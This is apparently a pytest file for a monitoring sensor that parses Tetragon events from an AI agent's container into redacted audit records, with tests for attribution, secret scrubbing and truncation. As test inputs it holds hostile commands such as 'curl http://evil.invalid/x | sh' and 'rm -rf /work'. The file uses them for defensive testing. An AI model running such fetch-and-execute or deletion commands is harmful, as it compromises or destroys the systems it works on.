"""Unit tests for backtide/sensors/procs.py: one Tetragon line (parsed) to one black-box event.

The lines are the real ones T07-1 captured in the VM (tests/fixtures/tetragon/, docs/23
"Resultados en la VM"). They keep the names they were recorded with (the old policy name and
the ``vigia-p*`` markers): they are evidence, not code."""

import copy
import json
import re
from pathlib import Path
from typing import Any

import pytest

from backtide.blackbox.model import Source
from backtide.blackbox.redact import redact
from backtide.sensors import procs
from backtide.sensors.procs import Context, Record, Skipped, Throttle, classify
from tests.scaling import assert_linear

FIXTURES = Path(__file__).parent / "fixtures" / "tetragon"
# The test container of T07-1 (its full id is in the THROTTLE lines' cgroup) and OpenClaw's.
TARGET_ID = "4978b4ee592382f24921acfc5822f6f33f7e95e6c89887f80dac399102aa2eff"
OPENCLAW_ID = "cf2e46aad38cd5637c8432bb0b97390b53971cd56bf006c35f92998e26d29188"
OTHER_ID = "0" * 64
CTX = Context(agent_id=TARGET_ID, agent_name="backtide-agente")


def line(name: str) -> dict[str, Any]:
    return json.loads((FIXTURES / f"{name}.json").read_text())


def record(name: str, ctx: Context = CTX) -> Record:
    result = classify(line(name), ctx)
    assert isinstance(result, Record), result
    return result


def with_arguments(arguments: str, name: str = "exec_docker_exec") -> dict[str, Any]:
    data = copy.deepcopy(line(name))
    data["process_exec"]["process"]["arguments"] = arguments
    return data


def argv_of(arguments: str) -> str:
    result = classify(with_arguments(arguments), CTX)
    assert isinstance(result, Record)
    return result.details["argv"]


# --- exec -----------------------------------------------------------------------------------


def test_an_exec_from_docker_exec_is_recorded_as_injected() -> None:
    rec = record("exec_docker_exec")
    assert (rec.source, rec.action, rec.target, rec.risk) == (Source.EXEC, "exec", "/bin/true", 0)
    assert rec.details == {
        "argv": "vigia-p3-6ea54410b884",
        "cwd": "/app",
        "pid": 1601637,
        "uid": 1000,
        "parent": {"pid": 1601276, "binary": "/usr/bin/containerd-shim-runc-v2"},
        "container": TARGET_ID[:12],
        "container_name": "backtide-agente",
        "injected": True,
        "truncated": False,
        "argv_bytes": len("vigia-p3-6ea54410b884"),
        "t": "2026-10-17T09:45:23.220119379Z",
        "exec_id": "NWEyMGM1OWMyMzgzOjQ2NTcxMjIxMjU1NjAxNzoxNjAxNjM3",
    }


def test_an_exec_of_the_agents_own_tree_is_not_injected() -> None:
    rec = record("exec_init_tree")
    assert rec.target == "/usr/bin/sleep"
    assert rec.details["injected"] is False
    assert rec.details["parent"] == {"pid": 1601300, "binary": "/usr/bin/dash"}


def test_openclaw_at_rest_is_attributed_to_its_own_container() -> None:
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente")
    rec = record("exec_openclaw_at_rest", ctx)
    assert rec.target == "/usr/bin/git"
    assert rec.details["container"] == OPENCLAW_ID[:12]
    assert rec.details["argv"].startswith("-c maintenance.autoDetach=false")
    # ...and the same line is not the test container's.
    assert classify(line("exec_openclaw_at_rest"), CTX) == Skipped("other")


def test_a_field_filtered_exec_still_has_everything_the_event_needs() -> None:
    rec = record("exec_field_filtered")
    assert rec.details["parent"] == {"pid": 1601276, "binary": "/usr/bin/containerd-shim-runc-v2"}
    assert rec.details["injected"] is True
    assert rec.details["argv"] == "vigia-p11f-c59fe99362aa"


def test_processes_from_before_the_sensor_are_only_counted() -> None:
    """Marked, with its start time: the reader only records the ones that began while the
    sensor was down."""
    rec = record("exec_procfs")
    assert rec.preexisting is True
    assert rec.started == "2026-10-17T09:45:21.717563404Z"
    assert rec.details["preexisting"] is True


def test_arguments_lost_by_tetragon_are_marked() -> None:
    """T07-1, P5: past ~320 KiB the exec comes with dataArgs and without arguments."""
    rec = record("exec_arguments_lost")
    assert rec.details["arguments_lost"] is True
    assert rec.details["argv"] == ""
    assert rec.details["cwd"] == "<enomem>"


def test_dataargs_with_its_arguments_is_not_lost_and_is_cut_to_1_kib() -> None:
    rec = record("exec_long_arguments")
    assert "arguments_lost" not in rec.details
    assert rec.details["argv_bytes"] > 90_000
    assert len(rec.details["argv"].encode()) <= procs.ARGV_LIMIT
    assert "bytes in all]…" in rec.details["argv"]  # the cut says so


def test_tetragon_truncation_flags_are_reported() -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["flags"] = "execve clone truncArgs"
    result = classify(data, CTX)
    assert isinstance(result, Record) and result.details["truncated"] is True


def test_a_runc_init_is_recorded_and_flagged() -> None:
    """Every docker exec starts with runc's own init: recorded (the agent could imitate the
    name), only flagged when its parent really is the containerd shim."""
    data = with_arguments("init")
    data["process_exec"]["process"]["binary"] = "/proc/self/fd/6"
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and rec.details["runc_init"] is True
    data["process_exec"]["parent"]["binary"] = "/usr/bin/python3"
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and "runc_init" not in rec.details


# --- exit -----------------------------------------------------------------------------------


def test_a_normal_exit_is_not_recorded() -> None:
    assert classify(line("exit_normal"), CTX) == Skipped("exit")


def test_an_exit_by_signal_is_recorded() -> None:
    rec = record("exit_signal")
    assert (rec.source, rec.action, rec.target) == (Source.EXEC, "exit", "/usr/bin/sh")
    assert rec.details == {
        "pid": 1601698,
        "signal": "SIGKILL",
        "status": 0,
        "container": TARGET_ID[:12],
        "t": "2026-10-17T09:45:23.869638200Z",
        "exec_id": line("exit_signal")["process_exit"]["process"]["exec_id"],
    }


# --- connect --------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "target", "family", "proto"),
    [
        ("connect_tcp4", "192.0.2.1:24226", "AF_INET", "tcp"),
        ("connect_tcp6", "[2001:db8::1]:24226", "AF_INET6", "tcp"),
        ("connect_udp4", "192.0.2.1:24226", "AF_INET", "udp"),
    ],
)
def test_a_connect_attempt_is_recorded(name: str, target: str, family: str, proto: str) -> None:
    rec = record(name)
    assert (rec.source, rec.action, rec.target, rec.risk) == (Source.NET, "connect", target, 0)
    assert rec.details["family"] == family
    assert rec.details["proto"] == proto
    assert rec.details["port"] == 24226
    assert rec.details["pid"] == 1601976
    assert rec.details["binary"] == "/usr/bin/python3"
    assert rec.details["container"] == TARGET_ID[:12]
    assert rec.details["t"].startswith("2026-10-17T09:45:27.53")


def test_loopback_connects_are_skipped() -> None:
    assert classify(line("connect_loop4"), CTX) == Skipped("loopback")
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente")
    assert classify(line("connect_openclaw_loopback"), ctx) == Skipped("loopback")


def _connect_to(addr: str, port: int, family: str = "AF_INET") -> dict[str, Any]:
    data = copy.deepcopy(line("connect_tcp4"))
    data["process_kprobe"]["args"][1]["sockaddr_arg"] = {
        "family": family,
        "addr": addr,
        "port": port,
    }
    return data


@pytest.mark.parametrize(
    ("addr", "port", "family"),
    [("127.0.0.1", 80, "AF_INET"), ("127.255.0.9", 53, "AF_INET"), ("::1", 443, "AF_INET6")],
)
def test_every_loopback_address_is_skipped(addr: str, port: int, family: str) -> None:
    assert classify(_connect_to(addr, port, family), CTX) == Skipped("loopback")


def test_dockers_dns_is_not_treated_as_loopback() -> None:
    """127.0.0.11:53 is how the agent's name lookups look (docs/23, "Bucle local")."""
    rec = classify(_connect_to("127.0.0.11", 53), CTX)
    assert isinstance(rec, Record) and rec.target == "127.0.0.11:53"
    assert classify(_connect_to("127.0.0.11", 54), CTX) == Skipped("loopback")


@pytest.mark.parametrize("addr", ["not-an-ip", "", "1.2.3.4.5"])
def test_a_connect_with_a_bad_address_is_invalid(addr: str) -> None:
    assert classify(_connect_to(addr, 80), CTX) == Skipped("invalid")


def test_a_connect_of_another_function_is_unknown() -> None:
    data = line("connect_tcp4")
    data["process_kprobe"]["function_name"] = "tcp_connect"
    assert classify(data, CTX) == Skipped("unknown")


# --- throttle ---------------------------------------------------------------------------


def test_throttle_events_of_the_agent_are_gaps() -> None:
    assert classify(line("throttle_start"), CTX) == Throttle(
        "start", "2026-10-17T09:45:40.166022589Z"
    )
    assert classify(line("throttle_stop"), CTX) == Throttle(
        "stop", "2026-10-17T09:45:45.509600984Z"
    )


def test_throttle_events_of_another_container_are_not_the_agents() -> None:
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente")
    assert classify(line("throttle_start"), ctx) == Skipped("other")


# --- attribution ----------------------------------------------------------------------------


def test_attribution_is_by_the_parsed_field_not_by_the_text() -> None:
    """eventos-falsos-en-argv: the agent's id in another container's arguments changes
    nothing, and a JSON event in the agent's arguments is only text."""
    data = line("exec_openclaw_at_rest")
    data["process_exec"]["process"]["arguments"] = f'"docker":"{TARGET_ID[:31]}"'
    assert classify(data, CTX) == Skipped("other")
    fake = json.dumps(line("connect_tcp6"))
    rec = classify(with_arguments(fake), CTX)
    assert isinstance(rec, Record) and rec.action == "exec" and rec.target == "/bin/true"


@pytest.mark.parametrize(
    "docker_field", ["", "4978b4ee592", "4978B4EE592382F2", "zz78b4ee592382f2"]
)
def test_a_short_or_malformed_container_field_is_not_the_agent(docker_field: str) -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["docker"] = docker_field
    assert classify(data, CTX) == Skipped("other")


def test_a_missing_container_field_is_not_the_agent() -> None:
    data = line("exec_docker_exec")
    del data["process_exec"]["process"]["docker"]
    assert classify(data, CTX) == Skipped("other")


def test_the_context_wants_a_full_container_id() -> None:
    with pytest.raises(ValueError):
        Context(agent_id=TARGET_ID[:31], agent_name="backtide-agente")


@pytest.mark.parametrize(
    "data",
    [
        {},
        {"process_exec": None},
        {"process_exec": {"process": "x"}},
        {"process_exec": {"process": {"docker": TARGET_ID[:31], "pid": "1", "binary": 7}}},
        {"process_kprobe": {"process": {"docker": TARGET_ID[:31]}, "args": "x"}},
        {"process_throttle": {"type": 5, "cgroup": None}},
        {"something_else": {}},
    ],
)
def test_odd_shapes_never_raise(data: dict[str, Any]) -> None:
    assert isinstance(classify(data, CTX), Record | Skipped | Throttle)


# --- probes ---------------------------------------------------------------------------------


def test_a_probe_carries_its_nonce() -> None:
    nonce = procs.new_nonce("hb")
    rec = classify(with_arguments(nonce), CTX)
    assert isinstance(rec, Record) and rec.nonce == nonce


@pytest.mark.parametrize(
    ("binary", "in_init_tree", "arguments"),
    [
        ("/tmp/true", False, None),  # noqa: S108 - a path inside the container
        ("/bin/true", True, None),
        ("/bin/true", False, "backtide-hb-short"),
    ],
)
def test_only_a_true_from_outside_the_tree_is_a_probe(
    binary: str, in_init_tree: bool, arguments: str | None
) -> None:
    data = with_arguments(arguments or procs.new_nonce("hb"))
    data["process_exec"]["process"]["binary"] = binary
    data["process_exec"]["process"]["in_init_tree"] = in_init_tree
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and rec.nonce is None


# --- what is never kept (docs/23, section 5) ----------------------------------------------

# Fake secrets only, each in a form an agent's command line uses.
FAKE = {
    "bearer": "fakeBearerToken0123456789abcdef",
    "x_api_key": "fakeXApiKey0123456789abcdef",
    "password_flag": "hunter2-fake-flag",
    "password_eq": "hunter2-fake-equals",
    "password_quoted": "two fake words",
    "token_flag": "fake-token-flag-0123",
    "client_secret": "fake-client-secret-0123",
    "env_key": "fakeEnvApiKey0123456789",
    "url_password": "fakeurlpassword",
    "curl_user": "fakecurlpassword",
    "sk": "sk-fakeabcdefghijklmnopqrstuv0123",
    "ghp": "ghp_fakeabcdefghijklmnopqrstuvwxyz",
    "akia": "AKIAFAKEABCDE0123456",
    "telegram": "123456789:AAFakeTelegramTokenabcdefghijklmnop",
    "cookie": "fakecookievalue0123",
    "pem": "MIIEfakePEMbodyfakePEMbody0123456789",
    "json_key": "fakeJsonApiKey0123",
    "py_password": "fake python password",
    "pass_flag": "fake-pass-flag-0123",
    "auth_flag": "fake-auth-flag-0123",
}

CATALOG = [
    f'-H "Authorization: Bearer {FAKE["bearer"]}" https://api.example.invalid/',
    f'-H "x-api-key: {FAKE["x_api_key"]}"',
    f"--password {FAKE['password_flag']}",
    f"--password={FAKE['password_eq']}",
    f'--password "{FAKE["password_quoted"]}"',
    f"--token {FAKE['token_flag']}",
    f"--client-secret {FAKE['client_secret']}",
    f"OPENAI_API_KEY={FAKE['env_key']} node agent.js",
    f"clone https://someone:{FAKE['url_password']}@example.invalid/repo.git",
    f"-u someone:{FAKE['curl_user']} https://example.invalid/",
    f"{FAKE['sk']} {FAKE['ghp']} {FAKE['akia']}",
    f"https://api.telegram.org/bot{FAKE['telegram']}/getMe",
    f'-H "Cookie: session={FAKE["cookie"]}"',
    f'-c "-----BEGIN RSA PRIVATE KEY-----\n{FAKE["pem"]}\n-----END RSA PRIVATE KEY-----"',
    f"-c \"requests.post(u, json={{'api_key': '{FAKE['json_key']}'}})\"",
    f"-c \"password = '{FAKE['py_password']}'\nlogin(password)\"",
    f"--pass {FAKE['pass_flag']} --auth={FAKE['auth_flag']}",
]


@pytest.mark.parametrize("arguments", CATALOG)
def test_no_fake_secret_reaches_the_event(arguments: str) -> None:
    rec = classify(with_arguments(arguments), CTX)
    assert isinstance(rec, Record)
    for stored in (json.dumps(rec.details), json.dumps(redact(rec.details))):
        leaked = [name for name, value in FAKE.items() if value in stored]
        assert not leaked, stored


def test_secrets_in_the_binary_and_cwd_are_struck_too() -> None:
    data = with_arguments("x")
    data["process_exec"]["process"]["binary"] = f"/tmp/{FAKE['sk']}"  # noqa: S108
    data["process_exec"]["process"]["cwd"] = f"/work/{FAKE['ghp']}"
    rec = classify(data, CTX)
    assert isinstance(rec, Record)
    assert FAKE["sk"] not in rec.target
    assert FAKE["ghp"] not in rec.details["cwd"]


def test_the_scrub_hook_strikes_known_secrets() -> None:
    known = "backtide-fake-anthropic-0123456789abcdef0123456789ab"
    ctx = Context(
        agent_id=TARGET_ID,
        agent_name="backtide-agente",
        scrub=lambda text: text.replace(known, "[REDACTED]"),
    )
    rec = classify(with_arguments(f"say {known}"), ctx)
    assert isinstance(rec, Record) and known not in json.dumps(rec.details)


def test_a_line_tetragon_already_struck_is_struck_again() -> None:
    """The first barrier's leftovers (an unclosed quote, T07-1 P11) go through the second."""
    rec = record("exec_redacted")
    assert rec.details["argv"].startswith("vigia-p11-a492428a6878 -H ")
    assert "[REDACTED]" in rec.details["argv"]


def test_the_environment_is_never_kept() -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["environment_variables"] = [{"key": "K", "value": "secret1"}]
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and "secret1" not in json.dumps(rec.details)


# --- safe text ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "shown"),
    [
        ("a\x1b[31mred", "a\\x1b[31mred"),
        ("two\nlines\r\tx", "two\\x0alines\\x0d\\x09x"),
        ("abc‮def", "abc\\u202edef"),
        ("nul\x00x", "nul\\x00x"),
        ("bad\udcffbyte", "bad\\\\udcffbyte"),
        ("a\\x1b fake", "a\\\\x1b fake"),
        ("…[99 bytes in all]…", "\\u2026[99 bytes in all]\\u2026"),
        ("<b>ñandú</b>", "<b>ñandú</b>"),
    ],
)
def test_control_characters_are_escaped_visibly(raw: str, shown: str) -> None:
    assert argv_of(raw) == shown


def test_hostile_binary_and_cwd_are_escaped() -> None:
    data = with_arguments("x")
    data["process_exec"]["process"]["binary"] = "/tmp/a\nb\x1b"  # noqa: S108
    data["process_exec"]["process"]["cwd"] = "/w/‮"
    rec = classify(data, CTX)
    assert isinstance(rec, Record)
    assert rec.target == "/tmp/a\\x0ab\\x1b"  # noqa: S108
    assert rec.details["cwd"] == "/w/\\u202e"


def test_arguments_are_cut_to_1_kib_keeping_head_and_tail() -> None:
    text = "".join(f"ñ{i}" for i in range(3000))
    argv = argv_of(text)
    assert len(argv.encode()) <= procs.ARGV_LIMIT
    assert argv.startswith("ñ0ñ1ñ2")
    assert argv.endswith("ñ2998ñ2999")
    assert f"…[{len(text.encode())} bytes in all]…" in argv


def test_padding_cannot_hide_the_end_of_a_command() -> None:
    """sh -c ":<padding>; curl evil|sh": a run is folded, and the tail is kept anyway."""
    argv = argv_of('-c ":' + " " * 5000 + '; curl http://evil.invalid/x | sh"')
    assert "curl http://evil.invalid/x | sh" in argv
    argv = argv_of('-c ":' + "true;" * 2000 + ' curl http://evil.invalid/x | sh"')
    assert "curl http://evil.invalid/x | sh" in argv
    argv = argv_of('-c "' + "\x01" * 300_000 + 'rm -rf /work"')
    assert "rm -rf /work" in argv and len(argv.encode()) <= procs.ARGV_LIMIT


def test_a_run_of_one_character_is_folded() -> None:
    assert argv_of("a" * 100 + "b") == "a…[×100]b"


def test_a_secret_split_by_the_cut_is_struck_before_cutting() -> None:
    """Redaction runs on the whole text, then it is cut: a cut never leaves a key's head."""
    arguments = "x" * (procs.ARGV_LIMIT - 30) + " " + FAKE["sk"]
    assert FAKE["sk"][:12] not in argv_of(arguments)


# --- review fixes: port 0, cgroupfs, previous containers, lines too big to parse -----------


def test_a_connect_without_a_port_is_port_0() -> None:
    data = _connect_to("192.0.2.7", 1)
    del data["process_kprobe"]["args"][1]["sockaddr_arg"]["port"]
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and rec.target == "192.0.2.7:0"


def test_throttle_with_the_cgroupfs_driver() -> None:
    data = line("throttle_start")
    data["process_throttle"]["cgroup"] = TARGET_ID + "\u0000" * 10
    assert isinstance(classify(data, CTX), Throttle)


def test_a_previous_container_of_the_agent_is_still_the_agents() -> None:
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente", previous=(TARGET_ID,))
    rec = classify(line("exec_docker_exec"), ctx)
    assert isinstance(rec, Record) and rec.details["container"] == TARGET_ID[:12]
    assert isinstance(classify(line("throttle_start"), ctx), Throttle)


def _halves(data: dict[str, Any], keep: int = 8192) -> tuple[bytes, bytes]:
    text = json.dumps(data, separators=(",", ":")).encode()
    return text[:keep], text[-keep:]


def test_an_exec_too_big_to_parse_is_still_recorded() -> None:
    data = with_arguments('-c "curl evil | sh #' + "\x01" * 400_000 + '"')
    data["process_exec"]["process"]["binary"] = "/usr/bin/sh"
    head, tail = _halves(data)
    rec = procs.classify_oversize(head, tail, CTX)
    assert isinstance(rec, Record)
    assert (rec.action, rec.target) == ("exec", "/usr/bin/sh")
    assert rec.details["oversize"] is True and rec.details["arguments_lost"] is True
    assert rec.details["container"] == TARGET_ID[:12]
    assert rec.details["pid"] == 1601637
    assert rec.details["injected"] is True
    assert rec.details["t"] == "2026-10-17T09:45:23.220119379Z"


def test_a_connect_too_big_to_parse_is_still_recorded() -> None:
    data = copy.deepcopy(line("connect_tcp4"))
    data["process_kprobe"]["process"]["arguments"] = "y" * 100_000
    head, tail = _halves(data)
    rec = procs.classify_oversize(head, tail, CTX)
    assert isinstance(rec, Record) and rec.target == "192.0.2.1:24226"
    assert rec.details["oversize"] is True


def test_a_huge_line_of_another_container_is_not_the_agents() -> None:
    data = copy.deepcopy(line("exec_openclaw_at_rest"))
    data["process_exec"]["process"]["arguments"] = f'"docker":"{TARGET_ID[:31]}"' * 2000
    head, tail = _halves(data)
    assert procs.classify_oversize(head, tail, CTX) == Skipped("other")


def test_garbage_too_big_to_parse_is_invalid() -> None:
    assert procs.classify_oversize(b"x" * 100, TARGET_ID.encode(), CTX) == Skipped("invalid")


# --- the key that spots a line read twice (T07-3) ---------------------------------------------


def test_each_kind_has_a_key_made_of_tetragons_exec_id() -> None:
    """A kill -9 of the service reads again the lines after the last saved cursor: the key,
    kept in the event's details, is how the reader knows it recorded them already."""
    exec_rec = record("exec_docker_exec")
    assert exec_rec.key == "exec:NWEyMGM1OWMyMzgzOjQ2NTcxMjIxMjU1NjAxNzoxNjAxNjM3"
    exit_rec = record("exit_signal")
    assert exit_rec.key == f"exit:{exit_rec.details['exec_id']}"
    connect = record("connect_tcp4")
    exec_id = line("connect_tcp4")["process_kprobe"]["process"]["exec_id"]
    assert connect.details["exec_id"] == exec_id
    assert connect.key == f"connect:{exec_id}:{connect.details['t']}"
    for rec in (exec_rec, exit_rec, connect):
        assert procs.event_key(rec.action, rec.details) == rec.key


@pytest.mark.parametrize("exec_id", [None, "", 7, "has spaces", "x" * 200, "<script>"])
def test_without_a_usable_exec_id_there_is_no_key(exec_id: object) -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["exec_id"] = exec_id
    rec = classify(data, CTX)
    assert isinstance(rec, Record)
    assert rec.key is None and rec.details["exec_id"] is None
    assert procs.event_key("exec", rec.details) is None


def test_event_key_ignores_what_is_not_a_sensor_event() -> None:
    assert procs.event_key("summary", {"exec_id": "abc"}) is None
    assert procs.event_key("exec", {"exec_id": ["abc"]}) is None
    assert procs.event_key("connect", {"exec_id": "abcdefgh", "t": 5}) is None
    assert procs.event_key("exec", "not details") is None  # type: ignore[arg-type]


# --- T07 review: a secret split at the edge of the windows (invariant 5) ----------------------

TOKEN = "Gq7vR2mX9kLp4TzW8nBc3YdF6hJs1QaE"  # 32 characters, like the Gateway token  # noqa: S105


def _pieces(secret: str, size: int = 8) -> list[str]:
    return [secret[i : i + size] for i in range(len(secret) - size + 1)]


def _leaks(stored: str, secret: str) -> list[str]:
    return [piece for piece in _pieces(secret) if piece in stored]


def _known_ctx(*secrets: str) -> Context:
    from backtide.blackbox.redact import KnownScrubber  # noqa: PLC0415

    return Context(
        agent_id=TARGET_ID,
        agent_name="backtide-agente",
        scrub=KnownScrubber(list(secrets), cut_tails=True).text,
    )


def test_a_known_secret_across_both_window_edges_is_struck_whole() -> None:
    """The review's case: runs fold, so both edges of the windows become visible."""
    w = procs._WINDOW
    arguments = "A" * (w - 20) + TOKEN + "B" * 3000 + TOKEN + "C" * (w - 20)
    rec = classify(with_arguments(arguments), _known_ctx(TOKEN))
    assert isinstance(rec, Record)
    stored = json.dumps(rec.details)
    assert _leaks(stored, TOKEN) == [], stored


@pytest.mark.parametrize("shift", [-30, -12, -3, 0, 3, 12, 30])
def test_a_known_secret_at_any_offset_of_the_edges_leaves_no_piece(shift: int) -> None:
    w = procs._WINDOW
    arguments = "A" * (w - 16 + shift) + TOKEN + "B" * 5000 + TOKEN + "C" * (w - 16 - shift)
    stored = json.dumps(classify(with_arguments(arguments), _known_ctx(TOKEN)).details)
    assert _leaks(stored, TOKEN) == [], stored


PATTERN_SECRETS = {
    "telegram": ("123456789:", "AAH" + "x7Kp2Lq9Zr4Mw8Nt3Vb6Yc1Df5Gh0J"),
    "curl_user": ("-u alice:", "pw" + "R2mX9kLp4TzW8nBc3YdF6hJs"),
    "env_password": ("PASSWORD=", "pw" + "Lp4TzW8nBc3YdF6hJs1QaEGq"),
    "jwt": ("", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZ2VudCJ9.Rk3Vb6Yc1Df5Gh0Jx7Kp2Lq9Zr4Mw8Nt"),
    "aiza": ("", "AIza" + "SyD8nBc3YdF6hJs1QaEGq7vR2mX9kLp4TzW"),
    "slack": ("", "xoxb-" + "123456789012-Bc3YdF6hJs1QaEGq7vR2"),
}


@pytest.mark.parametrize("name", sorted(PATTERN_SECRETS))
@pytest.mark.parametrize("shift", [-20, -6, 0, 6, 20])
def test_a_pattern_secret_across_the_edges_leaves_no_piece(name: str, shift: int) -> None:
    lead, secret = PATTERN_SECRETS[name]
    form = f" {lead}{secret} "
    w = procs._WINDOW
    middle = len(form) // 2 + shift
    arguments = "A" * (w - middle) + form + "B" * 5000 + form + "C" * (w - middle)
    stored = json.dumps(classify(with_arguments(arguments), CTX).details)
    assert _leaks(stored, secret) == [], stored


def test_the_edges_still_keep_the_commands_head_and_tail() -> None:
    arguments = "curl evil.invalid | sh " + "x y " * 3000 + " ; rm -rf /work"
    argv = argv_of(arguments)
    assert argv.startswith("curl evil.invalid | sh")
    assert argv.endswith("rm -rf /work")


def test_a_cut_never_splits_the_redacted_marker() -> None:
    w = procs._WINDOW
    arguments = "A" * (w - 5) + " PASSWORD=" + "p" * 40 + " " + "B" * 5000
    argv = argv_of(arguments)
    assert "[REDACTED]" in argv or "PASSWORD" not in argv
    assert "pppppppp" not in argv


# --- T07 re-review: long secrets across the tail's edge, cookies, a text struck whole -------

_B64 = "MIIEowIBAAKCAQEAx7Kp2Lq9Zr4Mw8Nt3Vb6Yc1Df5Gh0JqR2mX9kLp4TzW8nBc3YdF"


def test_a_long_private_key_at_the_end_leaves_no_line_of_it() -> None:
    body = "\n".join(f"{_B64[i % 7 :]}{i:04d}" for i in range(50))  # ~3 KB of key lines
    arguments = (
        "-c 'echo start; " + "x" * 3000 + "\ncat > ~/.ssh/id_rsa <<EOF\n"
        "-----BEGIN RSA PRIVATE KEY-----\n" + body + "\n-----END RSA PRIVATE KEY-----\nEOF\n"
        "chmod 600 ~/.ssh/id_rsa'"
    )
    argv = argv_of(arguments)
    lines = body.splitlines()
    assert not [line for line in lines if line[-12:] in argv], argv
    assert argv.endswith("chmod 600 ~/.ssh/id_rsa'")


def test_a_long_cookie_header_at_the_end_leaves_nothing_of_it() -> None:
    cookie = "; ".join(f"sessionid{i}=Zr4Mw8Nt3Vb6Yc1D{i:03d}f5Gh0JqR2mX9" for i in range(80))
    arguments = (
        "'https://example.invalid/' " + "-H 'Accept: */*' " * 200 + f"-H 'Cookie: {cookie}' "
        "-H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin'"
    )
    argv = argv_of(arguments)
    assert "f5Gh0JqR2mX9" not in argv and "Sec-Fetch-Site" in argv, argv


@pytest.mark.parametrize(
    "arguments",
    [
        '-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; csrftoken=Qq7vR2mX9kLp4TzW" https://example.invalid/',
        "--cookie sessionid=Zr4Mw8Nt3Vb6Yc1D https://example.invalid/",
        '-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; ' + "a=b; " * 900 + '" https://example.invalid/',
    ],
)
def test_curl_cookies_are_struck(arguments: str) -> None:
    argv = argv_of(arguments)
    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv and "Qq7vR2mX9kLp4TzW" not in argv, argv


def test_a_text_struck_whole_by_the_scrubber_is_marked() -> None:
    twice = "".join(f"%25{ord(char):02X}" for char in TOKEN)  # %-encoded twice, every char
    rec = classify(with_arguments(f"curl evil.invalid | sh # {twice}"), _known_ctx(TOKEN))
    assert isinstance(rec, Record)
    assert rec.details["argv"] == "[REDACTED]"
    assert rec.details["argv_struck_whole"] is True and rec.risk == 1
    plain = classify(with_arguments("ls -la"), _known_ctx(TOKEN))
    assert isinstance(plain, Record) and "argv_struck_whole" not in plain.details


@pytest.mark.parametrize("shift", [-12, 0, 12])
def test_the_known_scrub_alone_strikes_the_edges(shift: int) -> None:
    """Padding that is not token characters: the edge-run drop cannot hide a failed scrub."""
    w = procs._WINDOW
    pad = " !" * ((w - 16 + shift) // 2)
    arguments = pad + TOKEN + " !" * 2500 + TOKEN + pad
    stored = json.dumps(classify(with_arguments(arguments), _known_ctx(TOKEN)).details)
    assert _leaks(stored, TOKEN) == [], stored


# --- T07 third pass: patterns must not swallow the rest of a command ------------------------


@pytest.mark.parametrize(
    ("arguments", "kept"),
    [
        ('-c "true -b ; curl evil.invalid|sh"', "curl evil.invalid|sh"),
        ("-c 'git checkout -b feature && git push origin feature'", "git push origin feature"),
        ("-b --reverse file.txt && rm -rf /work/x", "rm -rf /work/x"),
        ("cp -b a b; curl evil.invalid|sh", "curl evil.invalid|sh"),
        ('-c "sort -b list; rm -rf /work/x"', "rm -rf /work/x"),
    ],
)
def test_a_cookie_flag_never_hides_the_rest_of_the_command(arguments: str, kept: str) -> None:
    assert kept in argv_of(arguments)


def test_a_quoted_cookie_still_goes_whole_even_unclosed() -> None:
    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of('-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; a=b')
    argv = argv_of('-b "sessionid=Zr4Mw8Nt3Vb6Yc1D; a=b" https://example.invalid/ && rm -rf x')
    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv and "rm -rf x" in argv


@pytest.mark.parametrize(
    "secret_form",
    [
        '--password "two words Zr4Mw8Nt3Vb6Yc1D',  # cut by the head window, no closing quote
        '{"api_key": "Zr4Mw8Nt3Vb6Yc1D more words',
        "{'client_secret': 'Zr4Mw8Nt3Vb6Yc1D more words",
    ],
)
def test_a_quoted_secret_cut_by_the_head_window_is_struck(secret_form: str) -> None:
    # The quote opens well inside the head window and closes nowhere in it (more than 512
    # characters later): the window's end closes it.
    arguments = "x " * 500 + secret_form + " ok" * 2000
    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of(arguments)


def test_a_private_key_block_and_bare_key_lines_are_struck() -> None:
    lines = "\n".join(("Zr4Mw8Nt3Vb6Yc1DqR2mX9kLp4TzW8nB" * 2)[:64] for _ in range(4))
    block = f"-----BEGIN PGP PRIVATE KEY BLOCK-----\n{lines}\n-----END PGP PRIVATE KEY BLOCK-----"
    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of(f"-c 'echo {block}'")
    assert "Zr4Mw8Nt3Vb6Yc1D" not in argv_of(f"-c 'echo\n{lines}\ndone'")


def test_a_fake_end_of_a_key_cannot_wipe_the_commands_before_it() -> None:
    arguments = (
        "-c 'echo " + "x " * 2500 + "; rm -rf /work/precious; echo -----END RSA PRIVATE KEY-----'"
    )
    assert "rm -rf /work/precious" in argv_of(arguments)


# --- T07 third pass: no cap leaves a long secret in clear, and no pattern is quadratic ------


@pytest.mark.parametrize("size", [600, 952, 1500, 5000])
@pytest.mark.parametrize(
    "form",
    [
        "export AWS_SESSION_TOKEN='{s}'",
        '--password "{s}"',
        '--api-key="{s}"',
        "password = '{s}'",
        '{{"api_key": "{s}"}}',
        '-b "sessionid={s}"',
    ],
)
def test_a_long_quoted_secret_is_struck_whole(size: int, form: str) -> None:
    secret = "Zr4Mw8Nt3Vb6" + "q" * size
    assert secret not in argv_of("run " + form.format(s=secret) + " && echo ok")


@pytest.mark.parametrize("size", [4097, 8000, 20000])
